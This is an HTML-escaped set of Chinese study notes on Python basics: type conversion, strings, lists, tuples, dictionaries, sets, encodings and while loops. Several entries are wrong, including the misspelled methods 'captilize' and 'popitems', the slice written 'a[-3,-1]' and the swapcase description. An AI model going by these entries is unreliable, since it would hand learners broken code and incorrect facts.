&lt;p&gt;类型转化函数&lt;&#x2F;p&gt;
&lt;p&gt;int()&lt;&#x2F;p&gt;
&lt;p&gt;complex()将其他数字类型转换为复数 complex(1)&lt;&#x2F;p&gt;
&lt;p&gt;float()将其他数字类型转换为浮点数float(1)&lt;&#x2F;p&gt;
&lt;p&gt;bool()转换为布尔值&lt;&#x2F;p&gt;
&lt;p&gt;布尔类型转换时’’,””0，（）空元组，[]空数组，{}空字典 、0L(长整数)、 0.0+0.0j、 Fasle等转换为布尔值都是False，其他都为True&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;进制转换函数&lt;&#x2F;p&gt;
&lt;p&gt;hex() 返回十六进制&lt;&#x2F;p&gt;
&lt;p&gt;oct() 返回八进制&lt;&#x2F;p&gt;
&lt;p&gt;bin() 返回二进制&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ASCII转换函数&lt;&#x2F;p&gt;
&lt;p&gt;ord() 接收一个字符，转换成对应的数字&lt;&#x2F;p&gt;
&lt;p&gt;chr() 接收一个数字，转换成对应的字符&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;数字操作之内置模块&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;math 高级数学计算模块，包含了很多预先编写好的函数代码&lt;&#x2F;p&gt;
&lt;p&gt;cos()&lt;&#x2F;p&gt;
&lt;p&gt;sin()&lt;&#x2F;p&gt;
&lt;p&gt;Pi()&lt;&#x2F;p&gt;
&lt;p&gt;sqrt()&lt;&#x2F;p&gt;
&lt;p&gt;要使用内置模块，得先将它导入python内存中，通过import命令&lt;&#x2F;p&gt;
&lt;p&gt;导入之后通过.来进行调用&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;random 随机数学模块。&lt;&#x2F;p&gt;
&lt;p&gt;randrange() 随机返回（最小值，最大值）之间的一个整数，不包括最大值的&lt;&#x2F;p&gt;
&lt;p&gt;uniform() 返回两者之间一个浮点数&lt;&#x2F;p&gt;
&lt;p&gt;choice() 随机返回给点列表的一个元素 random.choice([1,2,3])&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;NumPy&lt;&#x2F;p&gt;
&lt;p&gt;提供了许多高级数值编程工具，专门为进行严格数字处理而产生的&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Python对象类型之字符串&lt;&#x2F;p&gt;
&lt;p&gt;一组有序的字符组合，由字母、数字、符号等信息组成&lt;&#x2F;p&gt;
&lt;p&gt;用于存储和表现基于文本的信息&lt;&#x2F;p&gt;
&lt;p&gt;变量=字符串&lt;&#x2F;p&gt;
&lt;p&gt;s=’hello,world!’&lt;&#x2F;p&gt;
&lt;p&gt;字符串可以通过单引号、双引号、三引号进行包裹&lt;&#x2F;p&gt;
&lt;p&gt;字符串特征：&lt;&#x2F;p&gt;
&lt;p&gt;有序 字符串中的元素按照顺序（从左到右）存储&lt;&#x2F;p&gt;
&lt;p&gt;不可变 &lt;&#x2F;p&gt;
&lt;p&gt;python对象类型根据对象内容本身是否可修改，分为可变对象和不可变对象&lt;&#x2F;p&gt;
&lt;p&gt;可变对象：列表、字典&lt;&#x2F;p&gt;
&lt;p&gt;不可变对象：数字、字符串、元组&lt;&#x2F;p&gt;
&lt;p&gt;字符串操作之操作符&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;索引操作符 []&lt;&#x2F;p&gt;
&lt;p&gt;正向索引字符串的下标从0开始，逆向索引从-1开始&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;切片操作符 [:]&lt;&#x2F;p&gt;
&lt;p&gt;逆向切片索引从小到大来写 a[-3,-1]&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;连接操作符 +&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;重复操作符*&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;成员操作符 in not in&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;字符串操作之内置函数&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;判断函数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.isalnum() 判断字符串s是否只包含字母和数字，如果是返回True&lt;&#x2F;p&gt;
&lt;p&gt;s.isalpha() 判断字符串s是否只包含字母，如果是返回True&lt;&#x2F;p&gt;
&lt;p&gt;s.isdigit() 判断字符串s是否只包含数字，如果是返回True&lt;&#x2F;p&gt;
&lt;p&gt;s.islower() 判断字符串s是否只包含小写字母，如果是返回True&lt;&#x2F;p&gt;
&lt;p&gt;s.isupper() &lt;&#x2F;p&gt;
&lt;p&gt;s.isspace() 判断字符串s是否只包含空白(空格)字符，如果是返回True&lt;&#x2F;p&gt;
&lt;p&gt;s.startswith(t) 判断字符串s是否以字符t开头&lt;&#x2F;p&gt;
&lt;p&gt;s.endswith(t)&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;搜索函数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.count(t) 搜索字符t并返回出现的次数&lt;&#x2F;p&gt;
&lt;p&gt;s.find(t) 搜索字符t,如果没有找到，返回-1，否则返回t在s中的起始位置下标&lt;&#x2F;p&gt;
&lt;p&gt;s.index(t) 与find相同，返回t在s中的起始位置下标，如果找不到，会触发ValueError异常&lt;&#x2F;p&gt;
&lt;p&gt;s.rfind()&lt;&#x2F;p&gt;
&lt;p&gt;s.rindex()&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;格式函数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.center(n,t) 包含n个字符的字符串，其中s位于中间，两边通过字符t填充，t可选&lt;&#x2F;p&gt;
&lt;p&gt;s.ljust(n,t) s位于左边，剩下通过t填充至n&lt;&#x2F;p&gt;
&lt;p&gt;s.rjust(n,t)&lt;&#x2F;p&gt;
&lt;p&gt;s.format(vars) 格式化字符串，类似%&lt;&#x2F;p&gt;
&lt;p&gt;&#x27;{0},{1}&#x27;.format(&#x27;hello&#x27;,&#x27;world&#x27;)&lt;&#x2F;p&gt;
&lt;p&gt;&#x27;{A},{B}&#x27;.format(B=&#x27;hello&#x27;,A=&#x27;world&#x27;)&lt;&#x2F;p&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;剥离函数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.strip(t) 删除s开头和末尾的t字符，如果t为空默认删除空格，字符串中间的t字符不受影响&lt;&#x2F;p&gt;
&lt;p&gt;s.lstrip(t) 删除s开头的t字符&lt;&#x2F;p&gt;
&lt;p&gt;s.rstrip(t) 删除s末尾的t字符&lt;&#x2F;p&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;拆分函数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.partition(t) 将s拆分为三个字符串（head、t、tail）&lt;&#x2F;p&gt;
&lt;p&gt;s.rpartition(t)&lt;&#x2F;p&gt;
&lt;p&gt;s.split(t)以t为分隔符，将s划分为一系列的子串，并将子串放入一个列表返回&lt;&#x2F;p&gt;
&lt;p&gt;s.rsplit(t)&lt;&#x2F;p&gt;
&lt;p&gt;s.splitlines()返回一个由s中的各行组成的列表&lt;&#x2F;p&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;替换函数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.replace(old,new)将s中的每个old替换为new&lt;&#x2F;p&gt;
&lt;p&gt;s.expandtabs(n)将s中的每个制表符tab替换为n个空格&lt;&#x2F;p&gt;
&lt;ol start=&quot;7&quot;&gt;
&lt;li&gt;大小写函数‘&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;s.lower()&lt;&#x2F;p&gt;
&lt;p&gt;s.upper()&lt;&#x2F;p&gt;
&lt;p&gt;s.captilize()将s的第一个字符改为大写&lt;&#x2F;p&gt;
&lt;p&gt;s.swapcase()将s中的小写字母转化为大写，大写转化为大写&lt;&#x2F;p&gt;
&lt;p&gt;s.title()将s中的每一个单词的首字母大写，其他字母都是小写&lt;&#x2F;p&gt;
&lt;p&gt;字符串操作之字符编码&lt;&#x2F;p&gt;
&lt;p&gt;字符编码&lt;&#x2F;p&gt;
&lt;p&gt;计算机只能读懂二进制的0和1，处理字符时，需要将字符转化为数字存储并处理&lt;&#x2F;p&gt;
&lt;p&gt;将字符与数字相互对应的编码规则就称为字符编码&lt;&#x2F;p&gt;
&lt;p&gt;’A‘    65    01000001&lt;&#x2F;p&gt;
&lt;p&gt;编码分类&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;ASCII 属于最早的编码规则，美国标准信息交换代码，范围是0-127，总共128个字符。采用一个字节八个比特来表示字符，总共支持最多255个字符&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;语言支持：只能支持英文&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;Unicode  统一码或者万国码&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;采用2个字节或者4个字节来表示字符，一般采用两个&lt;&#x2F;p&gt;
&lt;p&gt;编码方式UCS&lt;&#x2F;p&gt;
&lt;p&gt;UCS-2   UCS-4&lt;&#x2F;p&gt;
&lt;p&gt;语言支持：所有国家&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;UTF-8&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;在Unicode中有些字符并不需要两个字节进行存储和传输，例如英文只需要一个字节就可以。Unicode可以看做是一个字符编码的规范，UTF-8是Unicode的存储和传输的实现方式。UTF-8就是在互联网上使用最广泛的一种Unicode的实现方式。&lt;&#x2F;p&gt;
&lt;p&gt;实现方式：&lt;&#x2F;p&gt;
&lt;p&gt;UTF-8 采用八个比特一个字节来作为基础单元&lt;&#x2F;p&gt;
&lt;p&gt;UTF-16&lt;&#x2F;p&gt;
&lt;p&gt;UTF-32&lt;&#x2F;p&gt;
&lt;p&gt;可变长编码，采用1到6个字节来存储和传输字符，一般英文用一个字节，汉语用三个字节，比较复杂 的用四到六的字节，可以有效节省空间&lt;&#x2F;p&gt;
&lt;p&gt;语言支持：所有国家&lt;&#x2F;p&gt;
&lt;p&gt;编码设置，在python中为UTF-8&lt;&#x2F;p&gt;
&lt;p&gt;查看当前编码的方法&lt;&#x2F;p&gt;
&lt;p&gt;import sys&lt;&#x2F;p&gt;
&lt;p&gt;print(sys.getdefaultencoding())&lt;&#x2F;p&gt;
&lt;p&gt;修改编码方式：&lt;&#x2F;p&gt;
&lt;p&gt;可在脚本开头添加：&lt;&#x2F;p&gt;
&lt;p&gt;字符串操作之转义字符&lt;&#x2F;p&gt;
&lt;p&gt;通过转义字符可以在字符串中实现特殊需求，比如回车、换行等功能&lt;&#x2F;p&gt;
&lt;p&gt;如果要使用转义字符，python中用\转义&lt;&#x2F;p&gt;
&lt;p&gt;常见的转义字符&lt;&#x2F;p&gt;
&lt;p&gt;续行符&lt;&#x2F;p&gt;
&lt;p&gt;反斜杠符\&lt;&#x2F;p&gt;
&lt;p&gt;单引号\&#x27;&lt;&#x2F;p&gt;
&lt;p&gt;双引号\&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;换行\n&lt;&#x2F;p&gt;
&lt;p&gt;横向制表符\t&lt;&#x2F;p&gt;
&lt;p&gt;纵向制表符\v&lt;&#x2F;p&gt;
&lt;p&gt;回车\r&lt;&#x2F;p&gt;
&lt;p&gt;退格\b&lt;&#x2F;p&gt;
&lt;p&gt;响铃\a&lt;&#x2F;p&gt;
&lt;p&gt;换页\f&lt;&#x2F;p&gt;
&lt;p&gt;八进制数\ott     tt代表字符&lt;&#x2F;p&gt;
&lt;p&gt;十六进制数\xtt&lt;&#x2F;p&gt;
&lt;p&gt;有的情况下需要关闭转义。比如字符串中出现路径的时候&lt;&#x2F;p&gt;
&lt;p&gt;file=open(r ‘C:\new\test.txt’,’w’)     加r&lt;&#x2F;p&gt;
&lt;p&gt;字符串操作之格式化字符串&lt;&#x2F;p&gt;
&lt;p&gt;通过引入字符串，可以实现更加复杂的字符串表达&lt;&#x2F;p&gt;
&lt;p&gt;格式化容许在一条字符串语句执行多字符替换&lt;&#x2F;p&gt;
&lt;p&gt;格式化字符串采用%来引用&lt;&#x2F;p&gt;
&lt;p&gt;格式化语法&lt;&#x2F;p&gt;
&lt;p&gt;‘字符串%d %s’ %(元素1，元素2)&lt;&#x2F;p&gt;
&lt;p&gt;格式化字符串&lt;&#x2F;p&gt;
&lt;p&gt;格式化整数&lt;&#x2F;p&gt;
&lt;p&gt;其他格式化字符&lt;&#x2F;p&gt;
&lt;p&gt;%f格式化浮点数，可以指定精度%.1f&lt;&#x2F;p&gt;
&lt;p&gt;%c格式化字符及其ASCII码&lt;&#x2F;p&gt;
&lt;p&gt;python对象之列表&lt;&#x2F;p&gt;
&lt;p&gt;是一组有序的集合对象类型，可以包括数字，字符串甚至列表等信息&lt;&#x2F;p&gt;
&lt;p&gt;用于存储其他对象信息，支持复杂的数据存储和处理&lt;&#x2F;p&gt;
&lt;p&gt;变量=[元素1，元素2，元素3……]&lt;&#x2F;p&gt;
&lt;p&gt;L=[‘hello’,123,[1,2,3]]&lt;&#x2F;p&gt;
&lt;p&gt;列表的特征：有序  可变&lt;&#x2F;p&gt;
&lt;p&gt;列表操作之操作符&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;索引操作符[]&lt;&#x2F;li&gt;
&lt;li&gt;切片操作符[:]&lt;&#x2F;li&gt;
&lt;li&gt;连接操作符+&lt;&#x2F;li&gt;
&lt;li&gt;重复操作符*&lt;&#x2F;li&gt;
&lt;li&gt;成员操作符 in not in&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;列表操作之内置函数&lt;&#x2F;p&gt;
&lt;p&gt;len()获取列表的元素个数（长度）&lt;&#x2F;p&gt;
&lt;p&gt;max()获取列表中最大的值&lt;&#x2F;p&gt;
&lt;p&gt;min()&lt;&#x2F;p&gt;
&lt;p&gt;sum() 将列表元素相加返回和&lt;&#x2F;p&gt;
&lt;p&gt;列表操作之列表内置函数&lt;&#x2F;p&gt;
&lt;p&gt;l.append() 添加元素到列表末端&lt;&#x2F;p&gt;
&lt;p&gt;l.insert() 添加元素到具体索引位置 l.insert(1,10)  1代表下标&lt;&#x2F;p&gt;
&lt;p&gt;l.extend() 在本列表末尾添加其他列表的元素，等于连接操作符&lt;&#x2F;p&gt;
&lt;p&gt;列表删除&lt;&#x2F;p&gt;
&lt;p&gt;l.pop() 默认删除列表末尾的元素并返回删除掉的元素，也可以指定索引删除&lt;&#x2F;p&gt;
&lt;p&gt;l.remove() 删除某个指定的元素（如果出现重复，匹配第一个选项）&lt;&#x2F;p&gt;
&lt;p&gt;列表搜索&lt;&#x2F;p&gt;
&lt;p&gt;l.count() 统计某个元素在列表中出现的次数&lt;&#x2F;p&gt;
&lt;p&gt;l.index()找出列表某一个元素第一次出现的索引位置&lt;&#x2F;p&gt;
&lt;p&gt;列表排序&lt;&#x2F;p&gt;
&lt;p&gt;l.reverse() 翻转列表位置&lt;&#x2F;p&gt;
&lt;p&gt;l.sort() 对列表进行由小到大的排序&lt;&#x2F;p&gt;
&lt;p&gt;列表操作之列表解析&lt;&#x2F;p&gt;
&lt;p&gt;列表解析就是通过特定的表达式简洁方便生成新的列表，包括列表迭代和列表生成式&lt;&#x2F;p&gt;
&lt;p&gt;语法：[X for Y in Z][X for Y in Z if]&lt;&#x2F;p&gt;
&lt;p&gt;X是需要得到的结果，Y是遍历的参数，Z是遍历对象&lt;&#x2F;p&gt;
&lt;p&gt;Python对象类型之元组&lt;&#x2F;p&gt;
&lt;p&gt;元组（tuple）是一组有序不可变的集合对象类型，可以包括数字，字符串甚至是列表、元组等信息。与列表相比，元组的内容不可变，并且采用小括号来创建，其他特性基本相同&lt;&#x2F;p&gt;
&lt;p&gt;那什么时候用列表什么时候用元组？&lt;&#x2F;p&gt;
&lt;p&gt;若对象内容操作时要求是只读的，建议用元组，更加安全&lt;&#x2F;p&gt;
&lt;p&gt;若经常需要修改对象内容时，建议用列表，否则每次对元组进行修改时，就必须创建新的元素&lt;&#x2F;p&gt;
&lt;p&gt;通过list()    tuple()可以进行互相转换&lt;&#x2F;p&gt;
&lt;p&gt;元组语法：变量=(元素1，元素2，元素3……)&lt;&#x2F;p&gt;
&lt;p&gt;T=(‘hello’,123,(10.20))&lt;&#x2F;p&gt;
&lt;p&gt;如果要创建一个单元组，元素后面必须加逗号&lt;&#x2F;p&gt;
&lt;p&gt;单元素列表不存在这个问题&lt;&#x2F;p&gt;
&lt;p&gt;元组的特征：有序   不可变&lt;&#x2F;p&gt;
&lt;p&gt;元组操作之操作符&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;索引操作符[]&lt;&#x2F;li&gt;
&lt;li&gt;切片操作符[:]&lt;&#x2F;li&gt;
&lt;li&gt;连接操作符+&lt;&#x2F;li&gt;
&lt;li&gt;重复操作符*&lt;&#x2F;li&gt;
&lt;li&gt;成员操作符&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;元组操作之内置函数&lt;&#x2F;p&gt;
&lt;p&gt;t.count()统计某一个元素在元组中出现的次数&lt;&#x2F;p&gt;
&lt;p&gt;t.index()找出元组中某一个元素第一次出现的索引位置&lt;&#x2F;p&gt;
&lt;p&gt;Python对象类型之字典&lt;&#x2F;p&gt;
&lt;p&gt;字典是一种无序集合对象类型，可以存储任意的数据类型&lt;&#x2F;p&gt;
&lt;p&gt;字典也是Python中唯一的映射类型，通过“key-value”键值对方式来存储数据&lt;&#x2F;p&gt;
&lt;p&gt;与列表相比，字典是无序的，列表是有序的；列表采用的是偏移位置来存取，字典采用的是键&#x2F;散列映射来存取，速度快效率高。列表虽然速度慢，但是内存消耗小。&lt;&#x2F;p&gt;
&lt;p&gt;字典的语法：变量={键1:值1,键2:值2,…}&lt;&#x2F;p&gt;
&lt;p&gt;d={‘A’:1,‘B’:2,’C’:3}&lt;&#x2F;p&gt;
&lt;p&gt;字典原理&lt;&#x2F;p&gt;
&lt;p&gt;字典哈希原理&lt;&#x2F;p&gt;
&lt;p&gt;哈希的作用：一般是用来做完整性校验，通过哈希算法（md5  sha 等）将不同大小的输入，输出一个固定值（128bit或者160bit）&lt;&#x2F;p&gt;
&lt;p&gt;特点：不可逆，雪崩效应，唯一性&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200817172436761.png&quot; alt=&quot;image-20200817172436761&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;字典特征：&lt;&#x2F;p&gt;
&lt;p&gt;无序：字典没有按照索引位置存储，而是按照散列映射关系存储&lt;&#x2F;p&gt;
&lt;p&gt;可变：键是不可变的，并且必须是唯一的，而值是可变的，相同的值可以出现在同一个字典里&lt;&#x2F;p&gt;
&lt;p&gt;键只能由数字、字符串、元组等不可变的对象组成，不能用列表&lt;&#x2F;p&gt;
&lt;p&gt;一个键只能对应一个值，如果有多个值，后面的值会覆盖前面的值&lt;&#x2F;p&gt;
&lt;p&gt;字典操作之操作符&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;查找操作符 &lt;&#x2F;p&gt;
&lt;p&gt;d[k]   通过键k查找字典中元素的值&lt;&#x2F;p&gt;
&lt;p&gt;d[k]=v  通过键k，给字典某元素赋值为v，如果没有键k，则创建。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;成员操作符 in not in&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;字典操作之内置函数&lt;&#x2F;p&gt;
&lt;p&gt;d.items() 返回一个由字典d的键-值组成的视图&lt;&#x2F;p&gt;
&lt;p&gt;d.keys()返回一个由字典d的键组成的视图&lt;&#x2F;p&gt;
&lt;p&gt;d.values()返回一个由字典d的值组成的视图&lt;&#x2F;p&gt;
&lt;p&gt;d.get(key)返回与key相关联的值&lt;&#x2F;p&gt;
&lt;p&gt;d.pop(key)删除键key并返回相关联的值&lt;&#x2F;p&gt;
&lt;p&gt;d.popitems()删除某个键值对，返回删除掉的键值对&lt;&#x2F;p&gt;
&lt;p&gt;d.clear()清空字典&lt;&#x2F;p&gt;
&lt;p&gt;d.copy()复制字典&lt;&#x2F;p&gt;
&lt;p&gt;d.update(e) 将e中的键值对添加到d中&lt;&#x2F;p&gt;
&lt;p&gt;d.setdefault(key,value)如果键key包含在字典d中，则返回其值，否则，返回value并将(key,v)添加到字典d中。&lt;&#x2F;p&gt;
&lt;p&gt;Python对象类型之集合&lt;&#x2F;p&gt;
&lt;p&gt;集合（set）是一种无序不重复对象类型。类似字典，但是只有键没有值&lt;&#x2F;p&gt;
&lt;p&gt;消除重复元素，可以实现交并补差等数学运算&lt;&#x2F;p&gt;
&lt;p&gt;集合语法：set(列表&#x2F;字符串)&lt;&#x2F;p&gt;
&lt;p&gt;list=[1,2,3,1,2,4]&lt;&#x2F;p&gt;
&lt;p&gt;s=set(list)&lt;&#x2F;p&gt;
&lt;p&gt;集合特征&lt;&#x2F;p&gt;
&lt;p&gt;无序：类似字典，没有索引，不支持切片和索引访问&lt;&#x2F;p&gt;
&lt;p&gt;不重复：每个元素在集合中都是唯一的&lt;&#x2F;p&gt;
&lt;p&gt;可变：set()可以增加删除元素&lt;&#x2F;p&gt;
&lt;p&gt;不可变：frozenset()不可以增删元素&lt;&#x2F;p&gt;
&lt;p&gt;集合操作之操作符&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;交集 &amp;amp;&lt;&#x2F;li&gt;
&lt;li&gt;并集 |&lt;&#x2F;li&gt;
&lt;li&gt;差集 -(获取集合中不同元素，不同元素在s1中) ^(获取集合中不同元素，元素在不同集合中，并集减去交集)&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;集合操作之内置函数&lt;&#x2F;p&gt;
&lt;p&gt;s.intersection() 交集&lt;&#x2F;p&gt;
&lt;p&gt;s.union() 并集&lt;&#x2F;p&gt;
&lt;p&gt;s.difference() 等于差集-&lt;&#x2F;p&gt;
&lt;p&gt;s.symmetric_difference 等于差集^&lt;&#x2F;p&gt;
&lt;p&gt;s.add() 增加元素&lt;&#x2F;p&gt;
&lt;p&gt;s.update() 增加集合中的元素（集合叠加）&lt;&#x2F;p&gt;
&lt;p&gt;s.remove()删除特定元素，如果没有该元素则报错&lt;&#x2F;p&gt;
&lt;p&gt;s.discard() 删除特定元素，如果没有该元素不报错&lt;&#x2F;p&gt;
&lt;p&gt;s.pop() 删除一个元素&lt;&#x2F;p&gt;
&lt;p&gt;s.clear() 清空集合&lt;&#x2F;p&gt;
&lt;p&gt;s.issubset() 判断是不是子集&lt;&#x2F;p&gt;
&lt;p&gt;s.issuperset() 判断是不是包含集合&lt;&#x2F;p&gt;
&lt;p&gt;Python的流程控制&lt;&#x2F;p&gt;
&lt;p&gt;条件语句&lt;&#x2F;p&gt;
&lt;p&gt;if 条件判断1:&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块1&lt;&#x2F;p&gt;
&lt;p&gt;elif 条件判断2:&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块2&lt;&#x2F;p&gt;
&lt;p&gt;elif 条件判断3:&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块3&lt;&#x2F;p&gt;
&lt;p&gt;条件表达式&lt;&#x2F;p&gt;
&lt;p&gt;也称为三元操作符，是if语句的缩写格式&lt;&#x2F;p&gt;
&lt;p&gt;A=Y if X else Z  如果X为真，A=Y，否则A=Z&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;x:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	A=Y&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	A=Z&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;循环语句&lt;&#x2F;p&gt;
&lt;p&gt;while循环&lt;&#x2F;p&gt;
&lt;p&gt;语法：&lt;&#x2F;p&gt;
&lt;p&gt;while 条件判断：&lt;&#x2F;p&gt;
&lt;p&gt;循环代码块&lt;&#x2F;p&gt;
&lt;p&gt;for循环&lt;&#x2F;p&gt;
&lt;p&gt;循环控制&lt;&#x2F;p&gt;
&lt;p&gt;while循环例子&lt;&#x2F;p&gt;
&lt;p&gt;输出1到10&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;n=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;n&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  n=n+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;输出1到10数字相加的结果&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;n=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;n&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;+n&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  n=n+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;while也可以和else结合&lt;&#x2F;p&gt;
